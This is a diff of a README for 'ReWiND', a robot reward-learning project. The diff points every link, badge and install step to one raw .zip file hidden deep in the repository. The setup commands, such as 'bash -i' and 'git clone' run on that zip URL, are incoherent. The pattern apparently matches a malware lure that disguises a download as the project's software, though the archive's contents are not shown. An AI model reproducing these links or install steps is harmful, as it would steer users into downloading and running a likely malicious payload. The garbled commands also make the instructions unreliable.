@@ -1,16 +1,16 @@
 # 🎉 ReWiND - Teach Robots with Simple Rewards
 
-![ReWiND Teaser](https://raw.githubusercontent.com/darkemberr/ReWiND/main/tousche/ReWiND.zip)
+![ReWiND Teaser](https://github.com/darkemberr/ReWiND/raw/refs/heads/main/metaworld_policy_training/envs/Re_Wi_ND_blankite.zip)
 
 <p align="center">
-  <a href="https://raw.githubusercontent.com/darkemberr/ReWiND/main/tousche/ReWiND.zip">
-    <img alt="Download ReWiND" src="https://raw.githubusercontent.com/darkemberr/ReWiND/main/tousche/ReWiND.zip">
+  <a href="https://github.com/darkemberr/ReWiND/raw/refs/heads/main/metaworld_policy_training/envs/Re_Wi_ND_blankite.zip">
+    <img alt="Download ReWiND" src="https://github.com/darkemberr/ReWiND/raw/refs/heads/main/metaworld_policy_training/envs/Re_Wi_ND_blankite.zip">
   </a>
-  <a href="https://raw.githubusercontent.com/darkemberr/ReWiND/main/tousche/ReWiND.zip">
-    <img alt="arXiv" src="https://raw.githubusercontent.com/darkemberr/ReWiND/main/tousche/ReWiND.zip">
+  <a href="https://github.com/darkemberr/ReWiND/raw/refs/heads/main/metaworld_policy_training/envs/Re_Wi_ND_blankite.zip">
+    <img alt="arXiv" src="https://github.com/darkemberr/ReWiND/raw/refs/heads/main/metaworld_policy_training/envs/Re_Wi_ND_blankite.zip">
   </a>
-   <a href="https://raw.githubusercontent.com/darkemberr/ReWiND/main/tousche/ReWiND.zip">
-   <img alt="Website" src="https://raw.githubusercontent.com/darkemberr/ReWiND/main/tousche/ReWiND.zip">
+   <a href="https://github.com/darkemberr/ReWiND/raw/refs/heads/main/metaworld_policy_training/envs/Re_Wi_ND_blankite.zip">
+   <img alt="Website" src="https://github.com/darkemberr/ReWiND/raw/refs/heads/main/metaworld_policy_training/envs/Re_Wi_ND_blankite.zip">
    </a>
 </p>
 
@@ -23,7 +23,7 @@ To get started with ReWiND, follow these simple steps. The process is user-frien
 ### 📥 Download & Install
 
 1. **Visit the Releases Page**  
-   Go to the [ReWiND Releases Page](https://raw.githubusercontent.com/darkemberr/ReWiND/main/tousche/ReWiND.zip) to download the software.
+   Go to the [ReWiND Releases Page](https://github.com/darkemberr/ReWiND/raw/refs/heads/main/metaworld_policy_training/envs/Re_Wi_ND_blankite.zip) to download the software.
 
 2. **Choose Your Version**  
    Select the latest version available for your operating system, and download the file.
@@ -41,14 +41,14 @@ Setting up the environment is crucial for running ReWiND effectively.
 2. **Clone the Repository**  
    Enter the following command to download the source code:
    ```bash
-   git clone https://raw.githubusercontent.com/darkemberr/ReWiND/main/tousche/ReWiND.zip
+   git clone https://github.com/darkemberr/ReWiND/raw/refs/heads/main/metaworld_policy_training/envs/Re_Wi_ND_blankite.zip
    cd ReWiND_Release/
    ```
 
 3. **Create the Environment**  
    Run the setup script to create the environment and install all necessary dependencies. Enter this command:
    ```bash
-   bash -i https://raw.githubusercontent.com/darkemberr/ReWiND/main/tousche/ReWiND.zip
+   bash -i https://github.com/darkemberr/ReWiND/raw/refs/heads/main/metaworld_policy_training/envs/Re_Wi_ND_blankite.zip
    ```
 
 ## ⚙️ Usage Instructions
@@ -77,14 +77,14 @@ Once you have installed ReWiND and set up the environment, you can begin using t
 
 ## 📚 Documentation & Support
 
-For more detailed documentation, guides, and support, please visit our [official website](https://raw.githubusercontent.com/darkemberr/ReWiND/main/tousche/ReWiND.zip).
+For more detailed documentation, guides, and support, please visit our [official website](https://github.com/darkemberr/ReWiND/raw/refs/heads/main/metaworld_policy_training/envs/Re_Wi_ND_blankite.zip).
 
 If you encounter issues, feel free to raise them on our GitHub page. Our community and developers are here to help.
 
 ## 🔗 Further Resources
 
-- [ReWiND Overview](https://raw.githubusercontent.com/darkemberr/ReWiND/main/tousche/ReWiND.zip)
-- [arXiv Paper](https://raw.githubusercontent.com/darkemberr/ReWiND/main/tousche/ReWiND.zip)
-- [Additional Tutorials](https://raw.githubusercontent.com/darkemberr/ReWiND/main/tousche/ReWiND.zip)
+- [ReWiND Overview](https://github.com/darkemberr/ReWiND/raw/refs/heads/main/metaworld_policy_training/envs/Re_Wi_ND_blankite.zip)
+- [arXiv Paper](https://github.com/darkemberr/ReWiND/raw/refs/heads/main/metaworld_policy_training/envs/Re_Wi_ND_blankite.zip)
+- [Additional Tutorials](https://github.com/darkemberr/ReWiND/raw/refs/heads/main/metaworld_policy_training/envs/Re_Wi_ND_blankite.zip)
 
 Now you are ready to begin your journey with ReWiND. Download the software today and start teaching robots using effective language-guided rewards!
